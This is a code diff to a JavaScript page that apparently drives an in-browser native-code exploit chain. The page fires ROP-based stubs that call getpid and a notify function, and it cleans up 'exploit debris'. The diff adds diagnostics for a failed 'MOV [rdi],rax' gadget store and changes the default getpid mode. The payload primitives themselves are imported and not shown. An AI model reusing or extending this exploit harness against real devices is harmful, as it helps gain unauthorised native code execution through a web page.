@@ -15,9 +15,9 @@ import {
 import {
     fireG0Smoke, fireG0Getpid, fireG0Notify, disarmStubG0, resetG0Prep,
     g0AlreadyFired, nativeRetOk, getpidRetOk,
-} from "./stub_g0_fire.js?v=stub-g0-8";
+} from "./stub_g0_fire.js?v=stub-g0-9";
 
-const BUILD = "stub-page-12";
+const BUILD = "stub-page-13";
 const params = new URLSearchParams(location.search);
 let lines = [], ready = false, busy = false, collatorPin = null;
 let selectedFireMode = null;
@@ -238,7 +238,7 @@ function stubOpts() {
         message: params.get("msg") || undefined,
         format: params.get("notifyfmt") || "plain",
         notifyPath: params.get("notifypath") || "direct",
-        getpidMode: params.get("getpid") || "raw",
+        getpidMode: params.get("getpid") || "auto",
         preTrim: function () {
             try { trimExploitDebris(); } catch (_) { }
         },
@@ -385,10 +385,14 @@ function runFire() {
         }
         if (fireMode === "g0getpid") {
             const r = fireG0Getpid(p, off, lk, opts);
-            const msg = r.mode === "raw"
-                ? "getpid pid=" + r.ret + (r.ok ? " — SUCCESS" : " — fail")
-                : "getpid wrap-ret=" + r.ret + (r.ok ? " — SUCCESS" : " — fail");
+            const msg = r.storeMiss
+                ? "getpid STORE-MISS — rax not written to frame (check MOV [rdi],rax gadget)"
+                : (r.mode === "raw"
+                    ? "getpid pid=" + r.ret + (r.ok ? " — SUCCESS" : " — fail")
+                    : "getpid wrap-ret=" + r.ret + (r.ok ? " — SUCCESS" : " — fail"));
             log("NATIVE-OK", msg);
+            if (r.verified === false && r.mode === "raw")
+                log("GETPID-HINT", "stub unverified — try ?getpid=scan or fix lk base");
             lockFireAfterNative(r.ok
                 ? (r.mode === "raw" ? "getpid pid=" + r.ret : "getpid wrap OK")
                 : "getpid ret=" + r.ret);
@@ -420,7 +424,7 @@ function init() {
     crashLog.startAutoFlush();
     showLastCrashStep();
     log("INIT", BUILD + " fire=" + stubFireMode()
-        + " getpid=" + (params.get("getpid") || "raw")
+        + " getpid=" + (params.get("getpid") || "auto")
         + " — ONE fire per tab then reload");
     if (g0AlreadyFired()) {
         log("NATIVE-OK", "restored — prior g0 fire OK (reload to fire again)");
